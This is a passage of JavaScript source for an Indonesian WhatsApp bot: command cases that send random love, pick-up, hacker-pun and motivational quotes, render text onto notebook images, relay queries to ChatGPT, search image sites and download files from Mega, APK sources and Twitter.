    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  replygcyuta(bacotan)
}
break
//=========================================\\======
case 'quotesgombal': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  replygcyuta(bacotan)

}
break
//=========================================\\======
case 'quoteshacker': {
if (!users.registered) return IsReg() 
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const heker = [
  "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
  "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
  "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
  "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
  "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
  "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
  "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
  "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
  "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
  "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
  "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
  "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
  "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
  "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
  "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
  "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
  "SQLI ( Structured Query Love Injection )",
  "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
  "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
  "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
  "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
  "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
  "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
  "Jangan men-dualboot-kan hatiku kepadamu.",
  "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
  "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
  "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
  "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
  replygcyuta(bacotan)
}
break
//=========================================\\======
case 'quotesbijak':{
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const quotes = [
"Keyakinan merupakan suatu pengetahuan di dalam hati, jauh tak terjangkau oleh bukti.",
"Rasa bahagia dan tak bahagia bukan berasal dari apa yang kamu miliki, bukan pula berasal dari siapa diri kamu, atau apa yang kamu kerjakan. Bahagia dan tak bahagia berasal dari pikiran kamu.",
"Sakit dalam perjuangan itu hanya sementara. Bisa jadi kamu rasakan dalam semenit, sejam, sehari, atau setahun. Namun jika menyerah, rasa sakit itu akan terasa selamanya.",
"Hanya seseorang yang takut yang bisa bertindak berani. Tanpa rasa takut itu tidak ada apapun yang bisa disebut berani.",
"Jadilah diri kamu sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri kamu sendiri?",
"Kesempatan kamu untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan kamu pada diri sendiri.",
"Kebanggaan kita yang terbesar adalah bukan tidak pernah gagal, tetapi bangkit kembali setiap kali kita jatuh.",
"Suatu pekerjaan yang paling tak kunjung bisa diselesaikan adalah pekerjaan yang tak kunjung pernah dimulai.",
"Pikiran kamu bagaikan api yang perlu dinyalakan, bukan bejana yang menanti untuk diisi.",
"Kejujuran adalah batu penjuru dari segala kesuksesan. Pengakuan adalah motivasi terkuat. Bahkan kritik dapat membangun rasa percaya diri saat disisipkan di antara pujian.",
"Segala sesuatu memiliki kesudahan, yang sudah berakhir biarlah berlalu dan yakinlah semua akan baik-baik saja.",
"Setiap detik sangatlah berharga karena waktu mengetahui banyak hal, termasuk rahasia hati.",
"Jika kamu tak menemukan buku yang kamu cari di rak, maka tulislah sendiri.",
"Jika hatimu banyak merasakan sakit, maka belajarlah dari rasa sakit itu untuk tidak memberikan rasa sakit pada orang lain.",
"Hidup tak selamanya tentang pacar.",
"Rumah bukan hanya sebuah tempat, tetapi itu adalah perasaan.",
"Pilih mana: Orang yang memimpikan kesuksesan atau orang yang membuatnya menjadi kenyataan?",
"Kamu mungkin tidak bisa menyiram bunga yang sudah layu dan berharap ia akan mekar kembali, tapi kamu bisa menanam bunga yang baru dengan harapan yang lebih baik dari sebelumnya.",
"Bukan bahagia yang menjadikan kita bersyukur, tetapi dengan bersyukurlah yang akan menjadikan hidup kita bahagia.",
"Aku memang diam. Tapi aku tidak buta.",
]
let bacotan = pickRandom(quotes)
  replygcyuta(bacotan)
}
break

			case 'write': {
				replygcyuta(`*Example*\n${prefix}writeleft text\n${prefix}writeright text\n${prefix}folioleft text\n${prefix}folioright text`)
			}
			break
			case 'writeleft': {
				if (!text) return replygcyuta(`Send command *${prefix + command}* text`)
				replygcyuta(mess.loading)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./src/write/images/book/afterleft.jpg'
				])
				.on('error', () => replygcyuta(mess.error))
				.on('exit', () => {
					Yuta.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			case 'writeright': {
				if (!text) return replygcyuta(`Send command *${prefix + command}* text`)
				replygcyuta(mess.loading)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+128+129',
					fixHeight,
					'./src/write/images/book/afterright.jpg'
				])
				.on('error', () => replygcyuta(mess.error))
				.on('exit', () => {
					Yuta.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			case 'folioleft': {
				if (!text) return replygcyuta(`Send command *${prefix + command}* text`)
				replygcyuta(mess.loading)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+48+185',
					fixHeight,
					'./src/write/images/folio/afterleft.jpg'
				])
				.on('error', () => replygcyuta(mess.error))
				.on('exit', () => {
					Yuta.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			case 'folioright': {
				if (!text) return replygcyuta(`Send command *${prefix + command}* text`)
				replygcyuta(mess.loading)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+89+190',
					fixHeight,
					'./src/write/images/folio/afterright.jpg'
				])
				.on('error', () => replygcyuta(mess.error))
				.on('exit', () => {
					Yuta.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			
			// Ai Menu
			case 'ai2': case 'gpt2': case 'openai2': {
				if (!text) return replygcyuta(`Example: ${prefix + command} query`)
				const hasil = await chatGpt(text);
				replygcyuta(hasil)
			}
			break
			// Search Menu
case 'pixiv': {
if (!users.registered) return IsReg() 
if (!text) return replygcyuta(`Example: ${prefix + command} hello`)
try {
sendReaction("⏳")
const result = await fetchJson(`https://api.ryzendesu.vip/api/search/pixiv?query=${text}`)
let capt = `┏⪻── *[ s ᴇ ᴀ ʀ ᴄ ʜ - ᴘ ɪ ᴠ ɪ x ]* ──⪼┓\n`
capt += `〆 ᴀʀᴛɪs : ${result.artist}\n`
capt += `〆 ᴄᴀᴘᴛɪᴏɴ : ${result.caption}\n`
capt += `〆 ᴛᴀɢ : ${result.tags.join(', ')}\n`
capt += `┗⪻─────────────────────────⪼┛`
let get = result.Media[Math.floor(Math.random() * result.Media.length)]
let buttonnya = [{
name: 'cta_url',
buttonParamsJson: {
display_text: 'Web',
url: `www.pixiv.net`,
 merchant_url: `www.pixiv.net`
}
}]
 await Yuta.sendButtonImg(m.chat, capt, botname, null, get, buttonnya, fnews, saluran, `Pixiv By: ${ownername}`);
sendReaction("✅")
} catch (e) {
sendReaction("❌")
}}
break
case 'pinterest': case 'pin': {
try {
if (!users.registered) return IsReg() 
sendReaction("⏳")//loading
if (!text) return replygcyuta(`Nama?`);
let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
let res = data.resource_response.data.results.map(v => v.images.orig.url);
let get = res[Math.floor(Math.random() * res.length)]

let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: `search ${text} done`
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By : ${botname}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : { url: get } }, { upload: Yuta.waUploadToServer})), 
title: ``,
gifPlayback: true,
subtitle: ownername,
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
 {
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Next⎙","id":"${prefix}pin ${text}"}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: saluran,
newsletterName: `Pin By: ${ownername}`,
serverMessageId: 143
}
}
})
}
}
}, { quoted: fnews })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
sendReaction("✅")//selesai
} catch (err) {
sendReaction("❌")//error
replygcyuta(`Resut Error:
${err}`)
}}
break

case 'zero': case 'zerochan': {
if (!users.registered) return IsReg() 
if (!text) return replygcyuta(`Nama Karakter Anime? Contoh ${prefix + command} Yuta Okkotsu`)
try {
sendReaction("⏳")
let { images }= await fetchJson(`https://api-lenwy.vercel.app/zerochan?search=${text}`)
let get = images[Math.floor(Math.random() * images.length)]

let buttonnext = [{
name: 'quick_reply',
buttonParamsJson: { 
display_text: "Next",
id: `.zero ${text}`
}
}]
await Yuta.sendButtonImg(m.chat, `Search ${text}`, botname, null, get, buttonnext, fnews, saluran, 'Zero By: Apikey Lenwy')
sendReaction("✅")
} catch (err) {
sendReaction("❌")
}}
break

			case 'wallpaper': {
			if (!users.registered) return IsReg() 
                if (!text) return replygcyuta('Enter Query Title')
                replygcyuta(mess.loading)
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: Yuta.waUploadToServer })
          }), 
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})                
            }
            break
			case 'ringtone': {
			if (!users.registered) return IsReg() 
				if (!text) return replygcyuta(`Example: ${prefix + command} black rover`)
				let anu = await ringtone(text)
				let result = pickRandom(anu)
				await Yuta.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title + '.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
			
			// Downloader Menu
			case 'apk': {
	if (!users.registered) return IsReg() 
	try {
    if (command === 'apk') {
      if (!text) return replygcyuta(`*[❗] Please provide the APK Name you want to download.*`);
      let data = await download(text);
      if (data.size.replace(' MB', '') > 200) {
        return await Yuta.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      if (data.size.includes('GB')) {
        return await Yuta.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      await Yuta.sendMessage(
        m.chat,
        { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
        { quoted: m }
      )
    }
  } catch {
    return replygcyuta(`*[❗] An error occurred. Make sure to provide a valid link.*`);
  }
};
break
case 'mega':{
if (!users.registered) return IsReg() 
	try {
if (!text) return replygcyuta(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return replygcyuta('Error: File size is too large (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
        replygcyuta(downloadingMessage);
        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await Yuta.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return replygcyuta(`Error: ${error.message}`);
    }
}
break
/*
*[ Case Break Twdl ]
*/
case 'twitter': case 'twitterdl': case 'twdl': case 'xdl': {
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
if (limituser < 1) return limitAbis();
useLimit(1)
if (!text.includes('x.com')) return replygcyuta(`• *Example :* .${command} https://x.com/xxxx`)
let { desc } = await fg.twitter(text)
let capt = `〆 title:\n`
capt += `${desc}`
try {
sendReaction("⏳")
let gtAu = (await axios.post("https://api.cobalt.tools/api/json", {"url": text,}, {headers: {"Content-Type": "application/json", Accept: "application/json"}})).data
let buttonnya = [{
name: 'cta_url',
buttonParamsJson: {
display_text: 'Video Url Twitter',
url: text,
 merchant_url: text
}
}]
 await Yuta.sendButtonVid(m.chat, capt, botname, null, gtAu.url, buttonnya, fnews, saluran, `Twdl By: ${ownername}`);
 sendReaction("✅")
} catch (e) {
try {
sendReaction("⏳")
const Widipe = await fetchJson(`https://widipe.com/download/twtdl?url=${text}`)

let buttonnya = [{
name: 'cta_url',
buttonParamsJson: {
display_text: 'Video Url Twitter',
url: text,
 merchant_url: text
}
}]
await Yuta.sendButtonVid(m.chat, capt, botname, null, Widipe.result.url[0].hd, buttonnya, fnews, saluran, `Twdl By: ${ownername}`);
sendReaction("✅")
} catch (e) {
sendReaction("❌")
}}}
break
			case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!users.registered) return IsReg() 
